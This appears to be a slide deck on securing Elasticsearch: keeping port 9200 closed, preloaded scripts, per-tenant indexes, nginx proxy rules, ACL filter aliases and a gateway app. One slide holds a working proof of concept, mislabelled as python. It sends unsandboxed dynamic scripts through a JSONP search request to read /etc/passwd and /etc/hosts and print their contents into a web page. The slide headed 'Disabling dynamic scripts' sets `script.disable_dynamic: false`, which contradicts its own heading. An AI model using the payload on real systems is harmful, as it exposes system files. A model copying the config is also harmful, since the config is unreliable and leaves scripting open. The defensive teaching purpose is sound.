  ## Securing Elasticsearch


  ### Elasticsearch trusts you

  * There is no concept of a user
  * Out the box, systems that have access to port 9200 can basically do whatever they want
  * Do not allow direct access to port 9200


  ### Scripting

  * Elasticsearch provides robust scripting support
  * These scripts are *not* run in a sandbox
  * [Remote code execution is possible](http://blog.liftsecurity.io/2013/11/30/elasticsearch-command-execution-using-script)


  ### How to read a file system using dynamic scripts

  ```python
  read_file = (filename) ->
    """
    import java.io.File;
    import java.util.Scanner;
    new Scanner(new File("#{filename}")).useDelimiter("\\\\Z").next();
    """

  # This PoC assumes that there is at least one document stored in Elasticsearch, there are ways around that though
  $ ->
    payload = {
      "size": 1,
      "query": {
        "filtered": {
          "query": {
            "match_all": {
            }
          }
        }
      },
      "script_fields": {}
    }

    for filename in ["/etc/hosts", "/etc/passwd"]
      payload["script_fields"][filename] = {"script": read_file(filename)}

    $.getJSON "http://localhost:9200/_search?source=#{encodeURIComponent(JSON.stringify(payload))}&callback=?", (data) ->
      console.log(data)
      for hit in data["hits"]["hits"]
        for filename, contents of hit["fields"]
          document.write("<h2>#{filename}</h2>")
          for content in contents
            document.write("<pre>" + content + "</pre>")
          document.write("<hr>")
  ```


### Disabling dynamic scripts

```yaml
script.disable_dynamic: false
```


### Use preloaded scripts instead

```bash
$ cat config/scripts/scoring/recency_boost.mvel
(0.08 / ((3.16*pow(10,-11)) * abs(now - doc['timestamp'].date.getMillis()) + 0.05)) + 1.0
```

```json
{
  "script": "scoring_recency_boost",
  "params": {
    "now": 1386176910000
  }
}
 ```


### Segregate different tenants/users into separate indexes

* This allows you to create some high-level URL rules to eliminate cross-polination
* Some apis like multi-search, multi-get and bulk allow take indexes as URL parameters or in the request body
* Lock this down with `allow_explicit_index: false`


### Sample nginx proxy rules

```nginx
#
# Nginx proxy for Elasticsearch + Kibana
#
# In this setup, we are password protecting the saving of dashboards. You may
# wish to extend the password protection to all paths.
#
# Even though these paths are being called as the result of an ajax request, the
# browser will prompt for a username/password on the first request
#
# If you use this, you'll want to point config.js at http://FQDN:80/ instead of
# http://FQDN:9200
#
server {
  listen                *:80 ;

  server_name           kibana.myhost.org;
  access_log            /var/log/nginx/kibana.myhost.org.access.log;

  location / {
    root  /usr/share/kibana3;
    index  index.html  index.htm;
  }

  location ~ ^/_aliases$ {
    proxy_pass http://127.0.0.1:9200;
    proxy_read_timeout 90;
  }
  location ~ ^/.*/_aliases$ {
    proxy_pass http://127.0.0.1:9200;
    proxy_read_timeout 90;
  }
  location ~ ^/_nodes$ {
    proxy_pass http://127.0.0.1:9200;
    proxy_read_timeout 90;
  }
  location ~ ^/.*/_search$ {
    proxy_pass http://127.0.0.1:9200;
    proxy_read_timeout 90;
  }
  location ~ ^/.*/_mapping {
    proxy_pass http://127.0.0.1:9200;
    proxy_read_timeout 90;
  }

  # Password protected end points
  location ~ ^/kibana-int/dashboard/.*$ {
    proxy_pass http://127.0.0.1:9200;
    proxy_read_timeout 90;
    limit_except GET {
      proxy_pass http://127.0.0.1:9200;
      auth_basic "Restricted";
      auth_basic_user_file /etc/nginx/conf.d/kibana.myhost.org.htpasswd;
    }
  }
  location ~ ^/kibana-int/temp.*$ {
    proxy_pass http://127.0.0.1:9200;
    proxy_read_timeout 90;
    limit_except GET {
      proxy_pass http://127.0.0.1:9200;
      auth_basic "Restricted";
      auth_basic_user_file /etc/nginx/conf.d/kibana.myhost.org.htpasswd;
    }
  }
}
```


### Include ACLs in document body

```json
{
  "title": "Elasticsearch in Action",
  "price": 34.99,
  "visible_to_groups": [
    "spantree",
    "strangeloop"
  ],
  "visible_to_users": [
    "george_smith",
    "jane_jones"
  ]
}
```


### Use filter aliases to enforce ACLs

```json
curl -XPOST 'http://localhost:9200/_aliases' -d '{
  "actions": [
    {
      "add": {
        "index": "books",
        "alias": "books_visible_to_group_spantree",
        "filter": {
          "term": { "visible_to_group": "spantree" }
        }
      }
    }
  ]
}'
```


### For more complex requirements, consider a middle tier gateway app

* When you need things like field-level access policies, consider writing a gateway app
* Prefer to use asynchronous, non-blocking frameworks like [Node.js](http://nodejs.org/), [Ratpack](http://www.ratpack.io/) or [Frank](https://github.com/panesofglass/frank).


### Pseudocode for a gateway app

```coffee
http.createServer (req, res) ->
  # Authenticate and get user context
  userContext = authenticateAndGetUserContext(req)
  if userContext
    http.request "#{esRoot}/{req.path}", (esResponse, json) ->
      if not userContext.shouldPriceBeVisible
        delete json.price
      res.writeHead esResponse.head
      res.write json
      res.end()
  else
    res.writeHead 401, 'Unauthorized access'
```


### (Completely speculative) future security features

* Dynamic scripts running in a sandbox?
* Pluggable authentication (via CAS, JAAS, etc)?
* Document-level security?